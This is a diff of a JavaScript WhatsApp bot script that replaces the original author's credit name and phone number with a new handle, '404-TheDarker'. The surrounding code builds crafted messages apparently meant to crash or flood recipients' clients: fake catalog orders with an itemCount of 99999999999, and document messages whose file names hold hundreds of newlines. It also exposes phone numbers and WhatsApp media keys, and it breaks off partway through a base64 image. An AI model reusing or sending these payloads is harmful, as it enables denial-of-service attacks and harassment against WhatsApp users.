@@ -2,7 +2,7 @@
 › Create By Haikal
 › Base Ori Haikal
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 */
+🌷 KALAU MAU RENAME TARO CREDITS GUA : ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ */
 
 //=================================================//
 require('./hwkal')
@@ -114,11 +114,11 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833
 },
 "message": {
 "extendedTextMessage": {
-"text": "© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ]️",
+"text": "© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]️",
 "previewType": "NONE",
 "contextInfo": {
 "stanzaId": "3EB0382EDBB2",
-"participant": "6285723156229@s.whatsapp.net"
+"participant": "37122252056@s.whatsapp.net"
 }}}}
 //=================================================//
 const doc = { 
@@ -134,16 +134,16 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"fileName": `ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 //=================================================//
 const bangkal= (teks) => {
-haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
+haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
 } 
 // Target
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
 } 
 //=================================================//
 const deploy = (teks) => {
@@ -367,10 +367,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 99999999999,	
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"message": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "jpegThumbnail": mekih,
-"orderTitle": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"sellerJid": "6285723156229@s.whatsapp.net",
+"orderTitle": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"sellerJid": "37122252056@s.whatsapp.net",
 "token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
 }
 }), { userJid: m.chat, quoted: doc })
@@ -402,7 +402,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `🔥 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
+"fileName": `🔥 ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
 "fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
@@ -422,7 +422,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -460,7 +460,7 @@ var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
 "mimetype": "image/jpeg",
-"caption": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"caption": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
 "fileLength": "42521",
 "height": 426,
@@ -488,7 +488,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
-"fileName": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"fileName": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
 "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
 "mediaKeyTimestamp": "1657288637",
@@ -504,10 +504,10 @@ if (isBan) throw sticBanLu(from)
 
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 "matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
 "description": "Undangan Grup WhatsApp",
-"title": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"title": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
@@ -543,10 +543,10 @@ if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": "https://wa.me/c/6285723156229",
-"matchedText": "https://wa.me/c/6285723156229",
-"description": "Developer 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
-"title": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"text": "https://wa.me/c/37122252056",
+"matchedText": "https://wa.me/c/37122252056",
+"description": "Developer ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "previewType": "NONE",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -560,8 +560,8 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
-"displayName": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6285723156229:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
+"displayName": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=37122252056:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI